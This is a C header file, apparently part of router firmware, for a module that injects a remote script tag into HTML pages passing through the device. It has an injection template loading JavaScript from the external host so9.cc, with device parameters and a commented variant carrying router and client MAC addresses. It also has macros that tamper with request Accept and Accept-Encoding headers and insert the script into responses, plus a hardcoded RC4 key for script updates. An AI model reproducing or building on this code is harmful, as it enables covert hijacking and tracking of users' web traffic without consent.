#ifndef _SWD_JS_INJECT_H_
#define _SWD_JS_INJECT_H_

//#define LOCAL_JS_PC "/1.js"
//#define LOCAL_JS_PAD "/2.js"
//#define LOCAL_JS_PHONE "/3.js"
//#define SERV_JS_PC "/4.js"
//#define SERV_JS_PAD "/5.js"
//#define SERV_JS_PHONE "/6.js"
//#define JS_RC4_TMP "/7.js"

//#define SDW_JS_STR "jsserver"

#define JS_PATH_FORMAT "<script src='//%s' defer></script>"
//<script src='//so9.cc/r.js?v=%ROM-VER%&m1=%ROUTER-MAC-ADDR%&m2=%CLIENT-MAC-ADDR%'></script>
#define JS_URL "<script src='//so9.cc/j/?v=%s&t=%s&g=%s&c=%s' defer></script>"

#define ROM_VER "1"

//#define HTML_START_STR "<html"
#define HTML_START_STR "html"
#define HTML_HEAD_STR "<head"
#define META_NAME_STR "<meta name="
#define META_STR "<meta"
#define NAME_STR "name="
#define SCRIPT_START_STR "<script"
#define SCRIPT_END_STR "</script>"
#define TITLE_STR "<title"
#define NOTE_START_STR "<!--"
#define NOTE_END_STR "-->"

//*/*;q=0
#define ACCEPT_HEADER_LEN 7
//Accept:*/*;q=0
#define ACCEPT_HEADER_ALL_LEN 14
//Accept-Encoding:*/*;q=0
#define ACCEPTENCODING_HEADER_ALL_LEN 23

//#define JS_PC_VER "js_pc_ver"
//#define JS_PAD_VER "js_pad_ver"
//#define JS_PHONE_VER "js_phone_ver"

/*#define JS_FAIL_FILE					"/js_fail.txt"
#define JS_FAIL_NO_PLACE	1001
#define JS_FAIL_LEN_LIMIT	1002
#define JS_FAIL_FORMAT "{MAC:'%s',URL:'%s',TIME:'%04d%02d%02d%02d%02d%02d',ERROR:'%d'}"
#define JS_FAIL_MAX_NUM 50
#define POST_JS_FAIL_LEN 1000
#define JS_FAIL_ARRAY_NUM 10

typedef struct
{
	time_t fail_time;
	int fail_reason;
	int read_flag;
	char url[40];
}js_fail_record_t;*/

//#define DEBUG
#undef DEBUG


#define RC4_KEY_STR "D1nIhrjPxa"
#define RC4_INT unsigned int
typedef struct rc4_key_st
{
	RC4_INT x,y;
	RC4_INT data[256];
} RC4_KEY;
#if 0
typedef struct
{
	unsigned long sourceip;
	unsigned long destip;
	unsigned char 
}
#endif
//pc	pad		phone
enum sdw_js_switch_status
{
	JS_SWITCH_ALL_CLOSE = 0,
	JS_SWITCH_PHONE,
	JS_SWITCH_PAD,
	JS_SWITCH_PAD_PHONE,
	JS_SWITCH_PC,
	JS_SWITCH_PC_PHONE,
	JS_SWITCH_PC_PAD,
	JS_SWITCH_ALL_OPEN
};

enum update_js_status
{
	UPDATE_OK = 0,
	NO_UPDATE_NEED,
	GET_FILE_FAIL,
	RC4_CHECK_FAIL
};

enum js_device_path_index
{
	JS_PC = 0,
	JS_PAD,
	JS_PHONE
};

extern int js_inject_enable(void);
extern int js_inject_disable(void);

#ifdef DEBUG
#define PRINTF(fmt, arg...) printf(fmt, ##arg)
#else
#define PRINTF(fmt, arg...)
#endif 

#if 0
#define MOVE_HEADER_INJECT(header_str)    if((!accept_finish_flag) || (!acceptencoding_finish_flag))\
	    	{ret_value =  move_header_inject(data, (header_str), insert_str, request_header_tail_fix, &request_header_tail);\
		    if(ret_drop == ret_value)\
		    {PRINTF("!!!header %s exception ret_drop.!!!\n",header_str);return ret_drop;}\
		    else if(ret_success == ret_value)\
		    {accept_finish_flag = acceptencoding_finish_flag = true;}}
#endif

#define MOVE_HEADER_INJECT(header_str)    if(!accept_finish_flag)\
	    	{ret_value =  move_header_inject(data, (header_str), insert_str, request_header_tail_fix, &request_header_tail,&useragent_end_p,data_len);\
		    if(ret_drop == ret_value)\
		    {PRINTF("!!!header move %s exception ret_drop.!!!\n",header_str);return ret_drop;}\
		    else if(ret_success == ret_value)\
		    {accept_finish_flag = true;}}

#define REMOVE_HEADER(header_str)    if(accept_finish_flag)\
	    	{ret_value =  remove_header(data, (header_str),&request_header_tail_fix,&useragent_end_p,data_len);\
		    if(ret_drop == ret_value)\
		    {PRINTF("!!!header remove %s exception ret_drop.!!!\n",header_str);return ret_drop;}}

#define JS_INJECT(header_str)	if(!js_inject_flag)\
	        {ret_value = move_js_inject(data, (header_str), js_str, head_position_fix, &head_position_tail, &real_head_tail,http_header_len);\
				if(ret_drop == ret_value)\
				{PRINTF("!!!response Error: move_js_inject error.!!!\n");return ret_drop;}\
				else if(ret_success == ret_value)\
				{js_inject_flag = true;}}


#define JS_INJECT_REPEAT(header_str) if(!js_inject_flag)\
        {do{\
        ret_value = move_js_inject(data, (header_str), js_str, head_position_fix, &head_position_tail,&real_head_tail,http_header_len);\
                        if(ret_drop == ret_value){\
                                PRINTF("!!!response Error: move_js_inject error.!!!\n");\
                                return ret_drop;}\
                        else if(ret_success == ret_value){\
                                js_inject_flag = true;\
                                break;}\
                }while(ret_notfound != ret_value || ret_failure == ret_value);}

#if 0
#define ACCEPT_HEADER_REPLACE(a_header_str,finish_flag)  header_str = (a_header_str);\
											str_start = strstr_len(data, header_str,data_len);\
											if(NULL != str_start)\
											{\
											str_len = strlen(header_str);\
											char_p = str_start + str_len;\
											str_end = strchr(char_p, '\r');\
											if(NULL == str_end || str_end > request_header_tail_fix)\
											{\
												return ret_drop;\
											}\
											str_len = (int)(str_end - char_p);\
											if(str_len >= ACCEPT_HEADER_LEN)\
											{\
												memcpy(char_p, accept_part_header, ACCEPT_HEADER_LEN);\
												char_p += ACCEPT_HEADER_LEN;\
												while(((int)char_p)<((int)str_end))\
												{\
													*char_p++ = ' ';\
												}\
												(finish_flag) = true;\
											}\
											else\
											{\
												if(request_header_tail_fix != str_end)\
												{\
													str_len = request_header_tail_fix-str_end-2;\
													memcpy(str_start,str_end+2,str_len);\
													request_header_tail -= str_len;\
												}\
												else\
												{\
													request_header_tail = str_start;\
												}\
											}}
#endif

#endif

